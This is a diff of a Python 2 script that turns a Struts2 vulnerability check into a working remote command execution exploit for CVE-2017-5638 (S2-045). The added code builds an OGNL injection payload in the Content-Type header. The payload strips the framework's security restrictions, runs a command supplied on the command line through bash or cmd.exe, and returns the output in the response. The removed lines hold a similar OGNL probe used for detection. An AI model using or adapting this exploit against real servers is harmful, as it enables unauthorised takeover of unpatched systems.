@@ -1,36 +1,47 @@
-#!/usr/bin/evn python
-# -*-:coding:utf-8 -*-
-import urlparse
-import random
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import urllib2
+import httplib
 
 
-def assign(service, arg):
-    if service == fingerprint.struts:
-        return True, arg
+def exploit(url, cmd):
+    payload = "%{(#_='multipart/form-data')."
+    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+    payload += "(#_memberAccess?"
+    payload += "(#_memberAccess=#dm):"
+    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
+    payload += "(#ognlUtil.getExcludedClasses().clear())."
+    payload += "(#context.setMemberAccess(#dm))))."
+    payload += "(#cmd='%s')." % cmd
+    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
+    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
+    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+    payload += "(#ros.flush())}"
 
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
+        request = urllib2.Request(url, headers=headers)
+        page = urllib2.urlopen(request).read()
+    except httplib.IncompleteRead, e:
+        page = e.partial
 
-def audit(arg):
-    uri = urlparse.urlparse(arg).path
-    randint1 = random.randint(1000, 10000)
-    raw = """POST {uri} HTTP/1.1
-Accept-Encoding: identity
-Content-Length: 171
-Content-Type: %{{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('{randomint1}'+602+53718)).(#o.close())}}
-Connection: close
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+    print(page)
+    return page
 
---1c88e9afa73c438d93b5043a7096b207
-Content-Disposition: form-data; name="image1"; filename="tmp.txt"
-Content-Type: text/plain
-
-
---1c88e9afa73c438d93b5043a7096b207--
-""".format(uri=uri, randomint1=str(randint1))
-
-    code, head, html, redir, log = hackhttp.http(arg, raw=raw)
-    if code == 200 and "%s60253718" % str(randint1) in html:
-        security_hole("%s" % arg, log=log)
 
 if __name__ == '__main__':
-    from dummy import *
-    audit(assign(fingerprint.struts, "http://127.0.0.1:8080/memoshow.action")[1])
+    import sys
+    if len(sys.argv) != 3:
+        print("[*] struts2_S2-045.py <url> <cmd>")
+    else:
+        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
+        url = sys.argv[1]
+        cmd = sys.argv[2]
+        print("[*] cmd: %s\n" % cmd)
+        exploit(url, cmd)
